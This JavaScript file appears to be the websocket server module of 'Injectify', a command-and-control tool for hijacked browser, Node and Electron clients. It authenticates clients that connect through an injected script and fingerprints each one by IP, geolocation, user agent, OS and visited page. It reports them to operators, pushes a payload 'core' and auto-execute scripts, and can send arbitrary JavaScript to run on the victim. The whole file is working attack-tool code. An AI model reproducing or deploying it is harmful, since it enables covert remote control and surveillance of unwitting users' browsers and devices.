/* eslint-disable prefer-promise-reject-errors */
const atob = require('atob')
const chalk = require('chalk')
const config = require('../../server.config.js')
const geoip = require('geoip-lite')
const {flag} = require('country-emoji')
const parseAgent = require('user-agent-parser')
const twemoji = require('twemoji')
const getIP = require('../modules/getIP.js')

module.exports = (db, inject, socket) => {
  let checkIfValid = socket => {
    return new Promise((resolve, reject) => {
      let project = socket.url.split('?')
      if (!project) {
        reject('websocket connection with invalid / missing project name, terminating')
        return
      }
      let debug = false
      project = project[project.length - 1]
      if (project.charAt(0) === '$') {
        project = project.substring(1)
        debug = true
      }
      if (!project) {
        reject('websocket connection with invalid / missing project name, terminating')
        return
      }

      try {
        project = atob(project)
      } catch (e) {
        reject('websocket with invalid base64 encoded project name, terminating')
        return
      }
      db.collection('projects', (err, projects) => {
        if (err) throw err
        projects.findOne({
          'name': project
        }).then(doc => {
          if (doc === null) {
            reject(`websocket connection to nonexistent project "${project}", terminating`)
          } else {
            resolve({
              project: {
                id: doc['_id'],
                name: doc.name,
                inject: doc.inject
              },
              id: +new Date(),
              debug: debug
            })
          }
        })
      })
    })
  }
  let send = (topic, data) => {
    socket.write(
      JSON.stringify({
        t: topic,
        d: data
      })
    )
  }
  checkIfValid(socket).then(data => {
    send('auth', `var server=ws.url.split("/"),protocol="https://";"ws:"===server[0]&&(protocol="http://"),server=protocol+server[2];var auth=new Image;auth.src=server+"/a?id=${encodeURIComponent(socket.id)}&z=${+new Date()}";auth.onload`)
    inject.authenticate[socket.id] = (token, authReq) => {
      let { debug, project } = data
      /**
       * Create an object for the project's client
       */
      if (!inject.clients[project.id]) inject.clients[project.id] = {}

      /**
       * Gather details about the connection
       */
      let inDebug = socket.url.charAt(19) === '$'
      let platform = 'browser'
      let browser = '/assets/svg/default.svg'
      let country = 'https://twemoji.maxcdn.com/2/svg/2753.svg'

      let ip
      try {
        ip = {
          query: socket.headers['x-forwarded-for'].split(',')[0]
        }
      } catch (e) {
        ip = {
          query: getIP(socket.remoteAddress)
        }
      }
      let parsedIP = geoip.lookup(ip.query)
      if (parsedIP) {
        parsedIP.query = ip.query
        ip = parsedIP
        country = 'https://twemoji.maxcdn.com/2/svg/' + twemoji.convert.toCodePoint(flag(ip.country)) + '.svg'
      }

      if (config.debug) {
        console.log(
          chalk.greenBright('[inject] ') +
          chalk.yellowBright('new websocket connection for project ') +
          chalk.magentaBright(project.name) +
          chalk.yellowBright(' from ') +
          chalk.magentaBright(ip.query)
        )
      }

      let agent = parseAgent(socket.headers['user-agent'])
      let os = false

      /**
       * Parse user-agent from the Injectify Electron application
       */
      if (socket.headers['user-agent'] && socket.headers['user-agent'].startsWith('{')) {
        try {
          os = JSON.parse(socket.headers['user-agent'])
        } catch (e) {
          //
        }
        if (os && os.client && (os.client.type === 'electron' || os.client.type === 'node')) {
          /**
           * NodeJS & Electron clients
           */
          browser = '/assets/svg/desktop/default.svg'
          platform = os.client.type
          try {
            if (os.client.type === 'electron') {
              agent.browser.name = 'Chrome'
              agent.engine.name = 'Electron'
            } else {
              agent.browser.name = 'NodeJS'
              agent.engine.name = 'ES6'
            }
            agent.device.type = 'desktop'
            if (os.versions) {
              let engine = os.client.type === 'electron' ? 'chrome' : 'node'
              if (typeof os.versions[engine] === 'string') {
                agent.browser.version = os.versions[engine]
                agent.browser.major = os.versions[engine].split('.')[0]
              }
              if (typeof os.versions.electron === 'string') {
                agent.engine.version = os.versions.electron
              } else {
                agent.engine.version = os.versions[engine]
              }
            }
            if (typeof os.vendor === 'string') {
              agent.device.vendor = os.vendor
            }
            if (typeof os.model === 'string') {
              agent.device.model = os.model
            }
            if (typeof os.type === 'string') {
              if (os.type.startsWith('Windows')) {
                browser = '/assets/svg/desktop/windows.svg'
                os.type = 'Windows'
                if (os.release) {
                  if (parseInt(os.release.split('.')[0]) >= 6 && (!os.release.startsWith('6.0') || !os.release.startsWith('6.1'))) {
                    browser = '/assets/svg/desktop/windows8.svg'
                  }
                }
              }
              agent.os.name = os.type
            }
            if (typeof os.release === 'string') {
              agent.os.version = os.release
            }
            if (typeof os.arch === 'string') {
              agent.cpu.architecture = os.arch
            }
            if (typeof os.cpus === 'object') {
              agent.cpu.cpus = os.cpus
            }
          } catch (e) {
            console.error(e)
          }
        } else {
          os = false
        }
      }

      /**
       * Define the correct path to the correct vendor icon
       */
      if (!os && socket.headers['user-agent']) {
        if (socket.headers['user-agent'].includes('SamsungBrowser')) {
          browser = '/assets/svg/samsung.svg'
        } else if (socket.headers['user-agent'].includes('Edge')) {
          browser = '/assets/svg/edge.svg'
        } else if (socket.headers['user-agent'].includes('Trident')) {
          browser = '/assets/svg/ie.svg'
        } else if (agent.browser.name) {
          var browserName = agent.browser.name.toLowerCase()
          if (browserName === 'chrome') {
            browser = '/assets/svg/chrome.svg'
          } else if (browserName === 'firefox') {
            browser = '/assets/svg/firefox.svg'
          } else if (browserName === 'safari') {
            browser = '/assets/svg/safari.svg'
          } else if (browserName === 'opera') {
            browser = '/assets/svg/opera.svg'
          } else if (browserName === 'ie') {
            browser = '/assets/svg/ie.svg'
          }
        }
      }

      if (!inject.clients[project.id][token]) {
        inject.clients[project.id][token] = {
          'user-agent': agent,
          'ip': ip,
          'images': {
            'country': country,
            'browser': browser
          },
          'sessions': [

          ]
        }
      }

      /**
       * Client object
       */
      var session = {
        'id': data.id,
        'debug': inDebug,
        'window': {
          'title': authReq.headers.referer,
          'url': authReq.headers.referer,
          'favicon': `https://plus.google.com/_/favicon?domain_url=${encodeURIComponent(authReq.headers.referer)}`,
          'active': false
        },
        'socket': {
          'headers': socket.headers,
          'id': socket.id,
          'remoteAddress': socket.remoteAddress,
          'remotePort': socket.remotePort,
          'url': socket.url
        },
        'execute': script => {
          send('execute', script)
        }
      }

      inject.clients[project.id][token].sessions.push(session)

      /**
       * Callback to the Injectify users
       */
      if (inject.watchers[project.id]) {
        setTimeout(() => {
          inject.watchers[project.id].forEach(watcher => {
            watcher.callback('connect', {
              token: token,
              data: inject.clients[project.id][token]
            })
          })
        }, 0)
      }

      /**
       * Send the inject core
       */
      let core = inject.core
      if (debug) core = inject.debugCore
      let socketHeaders = socket.headers
      delete socketHeaders['user-agent']
      core = core
      .replace('client.ip', JSON.stringify(ip))
      .replace('client.id', JSON.stringify(socket.id))
      .replace('client.agent', JSON.stringify(agent))
      .replace('client.headers', JSON.stringify(socketHeaders))
      .replace('client.platform', JSON.stringify(platform))
      .replace('client.os', JSON.stringify(os))
      send('core', core)

      /**
       * Send the auto-execute script
       */
      if (project.inject) {
        if (project.inject.autoexecute) {
          send('execute', project.inject.autoexecute)
        }
      }

      socket.on('data', rawData => {
        try { rawData = JSON.parse(rawData); if (!rawData.t && !rawData.d) return } catch (e) { return }
        let on = (topic, callback) => {
          if (topic !== rawData.t) return
          callback(rawData.d)
        }

        /**
         * Module loader
         */
        on('module', data => {
          try {
            if (!data.name) return
            let js = inject.modules[data.name]
            if (debug) js = inject.debugModules[data.name]
            if (js) {
              try {
                js = `${typeof data.token === 'number' ? `module.token=${data.token};` : ``}${data.params ? `module.params=${JSON.stringify(data.params)};` : ``}module.return=function(d){this.returned=d};${js}`
                send('module', {
                  name: data.name,
                  token: data.token,
                  script: js
                })
              } catch (error) {
                send('module', {
                  name: data.name,
                  token: data.token,
                  error: {
                    code: 'server-error',
                    message: `Encountered a server-side error whilst loading module "${data.name}"`
                  }
                })
              }
            } else {
              send('module', {
                name: data.name,
                token: data.token,
                error: {
                  code: 'not-installed',
                  message: `Module "${data.name}" not installed on server`
                }
              })
            }
          } catch (error) {
            console.error(
              chalk.redBright('[inject] ') +
              chalk.yellowBright(error)
            )
          }
        })

        /**
         * Client info logger
         */
        on('i', data => {
          /**
           * Max string length
           */
          let maxStringLength = 100
          let maxUrlLength = 2083
          /**
           * Safely parse data
           */
          if (typeof data === 'object') {
            if (typeof data.window === 'object') {
              let { title, url, active } = data.window
              if (typeof title === 'string') {
                session.window.title = title.substring(0, maxStringLength)
              }
              if (typeof url === 'string') {
                session.window.url = url.substring(0, maxUrlLength)
              }
              if (typeof active === 'boolean') {
                session.window.active = active
              }
            }
          }
        })

        /**
         * Data logger
         */
        on('l', data => {
          console.log(data)
        })

        /**
         * Error logger
         */
        on('e', data => {
          send('error', data)
          console.log(data)
        })

        /**
         * Get server ping time
         */
        on('ping', pingTime => {
          send('pong', pingTime)
        })

        /**
         * Get server ping time
         */
        on('heartbeat', data => {
          send('stay-alive')
        })

        /**
         * For testing execute's from the client side
         */
        on('execute', data => {
          send('execute', data)
        })
      })

      socket.on('close', () => {
        /**
         * Remove them from the clients object
         */
        if (inject.clients[project.id][token].sessions.length === 1) {
          /**
           * Only session left with their token, delete token
           */
          delete inject.clients[project.id][token]
        } else {
          /**
           * Other sessions exist with their token
           */
          inject.clients[project.id][token].sessions = inject.clients[project.id][token].sessions.filter(session => session.id !== data.id)
        }
        /**
         * Callback to the Injectify users
         */
        if (inject.watchers[project.id]) {
          setTimeout(() => {
            inject.watchers[project.id].forEach(watcher => {
              watcher.callback('disconnect', {
                token: token,
                id: session.id
              })
            })
          }, 0)
        }
      })
    }
  }).catch(error => {
    if (config.verbose) {
      console.error(
        chalk.redBright('[inject] ') +
        chalk.yellowBright(error)
      )
    }
  })
}